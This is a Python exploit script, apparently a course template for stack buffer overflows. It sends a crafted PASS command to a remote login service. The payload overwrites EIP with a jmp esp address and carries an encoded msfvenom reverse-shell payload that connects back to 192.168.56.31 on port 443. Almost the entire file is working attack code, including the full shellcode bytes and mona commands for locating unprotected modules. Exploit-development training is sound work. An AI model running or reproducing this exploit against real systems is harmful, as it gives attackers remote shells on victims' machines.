#!/usr/bin/env python3
import socket, time, sys

# NOTE: This template used https://www.exploit-db.com/exploits/1582 as the example
# IMPORTANT: Dont forget to set up l_bytes

# Phase 5: Confirm the exploit strategy

# ------------------------------------------------------------------
# How do we confirm the exploit strategy?
# ------------------------------------------------------------------
# We slowly walk through each step:
# 1) Make EIP jump to stager (if used)
# 2) Verify stager contains either our canary or our instructions to get to the shellcode
# 3) Verify shellcode lands where we want

if len(sys.argv) != 5:
    print()
    print("Usage: {} <target ip> <target port> <offset of eip> <total size of payload>".format(sys.argv[0]))
    print("\tTarget IP: Remote hostname or IP address of target service")
    print("\tTarget Port: Remote port of target sevice")
    print("\tOffset of EIP: Offset of EIP from start of payload")
    print("\tTotal size of payload: Set to minimum if only confirming offset of EIP. Increase to test if bigger payload destabilizes control of EIP.")
    exit(0)

# sys.argv is the list of command line arguments
RHOST = 1
RPORT = 2
OFFSET_EIP = 3
TOTAL_PAYLOAD_SIZE = 4

l_rhost: str = sys.argv[RHOST]
l_rport: int = int(sys.argv[RPORT])
l_offset_eip: int = int(sys.argv[OFFSET_EIP])
l_total_payload_size: int = int(sys.argv[TOTAL_PAYLOAD_SIZE])

#   EXAMPLE STRATEGY
# # Strategy:
# At time of crash, ESP points directly at post-return address buffer
# Find jmp esp instruction within a module that does not have protection
#   !mona nosafesehaslr

# !mona find -type instr -b 5F4A0000 -t 5F4A4000 -s "jmp esp"
#  Address=5F4A358F
#  Message=  0x5f4a358f : "jmp esp" |  {PAGE_READONLY} [SLMFC.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.8063.0 (C:\Windows\system32\SLMFC.DLL)

l_bytes_before_EIP: int = l_offset_eip
l_filler_a = "A" * l_bytes_before_EIP

# #Note: jmp esp instruction found at address 5F4A358F using !mona find -s "\xff\xe4" -m slmfc.dll
l_eip: bytes = bytes('\x8f\x35\x4a\x5f', encoding='iso-8859-1')
l_size_of_EIP: int = len(l_eip)

l_size_of_noop_sled: int = 16
l_noop_sled: bytes = bytes('\x90' * l_size_of_noop_sled, encoding='iso-8859-1')

#l_shellcode: bytes = bytes('\x43\x41\x4E\x41\x52\x59', encoding='iso-8859-1') # CANARY

# /usr/bin/msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.31 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
l_shellcode: bytes = bytes('\xd9\xd0\xd9\x74\x24\xf4\xbe\xac\x99\x66\x27\x58\x2b\xc9\xb1\x52\x31\x70\x17\x83\xc0\x04\x03\xdc\x8a\x84\xd2\xe0\x45\xca\x1d\x18\x96\xab\x94\xfd\xa7\xeb\xc3\x76\x97\xdb\x80\xda\x14\x97\xc5\xce\xaf\xd5\xc1\xe1\x18\x53\x34\xcc\x99\xc8\x04\x4f\x1a\x13\x59\xaf\x23\xdc\xac\xae\x64\x01\x5c\xe2\x3d\x4d\xf3\x12\x49\x1b\xc8\x99\x01\x8d\x48\x7e\xd1\xac\x79\xd1\x69\xf7\x59\xd0\xbe\x83\xd3\xca\xa3\xae\xaa\x61\x17\x44\x2d\xa3\x69\xa5\x82\x8a\x45\x54\xda\xcb\x62\x87\xa9\x25\x91\x3a\xaa\xf2\xeb\xe0\x3f\xe0\x4c\x62\xe7\xcc\x6d\xa7\x7e\x87\x62\x0c\xf4\xcf\x66\x93\xd9\x64\x92\x18\xdc\xaa\x12\x5a\xfb\x6e\x7e\x38\x62\x37\xda\xef\x9b\x27\x85\x50\x3e\x2c\x28\x84\x33\x6f\x25\x69\x7e\x8f\xb5\xe5\x09\xfc\x87\xaa\xa1\x6a\xa4\x23\x6c\x6d\xcb\x19\xc8\xe1\x32\xa2\x29\x28\xf1\xf6\x79\x42\xd0\x76\x12\x92\xdd\xa2\xb5\xc2\x71\x1d\x76\xb2\x31\xcd\x1e\xd8\xbd\x32\x3e\xe3\x17\x5b\xd5\x1e\xf0\xa4\x82\x18\x1f\x4d\xd1\x58\x1e\x36\x5c\xbe\x4a\x58\x09\x69\xe3\xc1\x10\xe1\x92\x0e\x8f\x8c\x95\x85\x3c\x71\x5b\x6e\x48\x61\x0c\x9e\x07\xdb\x9b\xa1\xbd\x73\x47\x33\x5a\x83\x0e\x28\xf5\xd4\x47\x9e\x0c\xb0\x75\xb9\xa6\xa6\x87\x5f\x80\x62\x5c\x9c\x0f\x6b\x11\x98\x2b\x7b\xef\x21\x70\x2f\xbf\x77\x2e\x99\x79\x2e\x80\x73\xd0\x9d\x4a\x13\xa5\xed\x4c\x65\xaa\x3b\x3b\x89\x1b\x92\x7a\xb6\x94\x72\x8b\xcf\xc8\xe2\x74\x1a\x49\x12\x3f\x06\xf8\xbb\xe6\xd3\xb8\xa1\x18\x0e\xfe\xdf\x9a\xba\x7f\x24\x82\xcf\x7a\x60\x04\x3c\xf7\xf9\xe1\x42\xa4\xfa\x23', encoding='iso-8859-1')
l_size_of_shellcode: int = len(l_shellcode)

l_bytes_after_EIP: int = l_total_payload_size - (l_bytes_before_EIP + l_size_of_EIP + l_size_of_noop_sled + l_size_of_shellcode)

l_filler_c: bytes = bytes('\x43' * l_bytes_after_EIP, encoding='iso-8859-1')

l_payload: bytes = l_filler_a.encode() + l_eip + l_noop_sled + l_shellcode + l_filler_c

try:
    # Create a TCP (socket)
    print("Connecting to {} port {}".format(l_rhost, l_rport))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((l_rhost, l_rport))
    print("Connected")
except:
    print("Could not connect to {} port {}".format(l_rhost, l_rport))
    exit(0)

time.sleep(2)

try:
    # Send the message via the socket using the specific protocol
    print("Sending USER parameter")
    l_bytes = 'USER jeremy\r\n'.encode()
    s.send(l_bytes)
    data = s.recv(1024)
    print("Data received: {}".format(data))
except:
    print("Could not send USER parameter")

time.sleep(2)

try:
    # Send the message via the socket using the specific protocol
    print("Sending PASS parameter of length {}".format(len(l_payload)))
    l_bytes = 'PASS '.encode() + l_payload + '\r\n'.encode()
    s.send(l_bytes)
    data = s.recv(1024)
    print("Data received: {}".format(data))
except:
    print("Could not send PASS parameter")

time.sleep(2)

s.close()
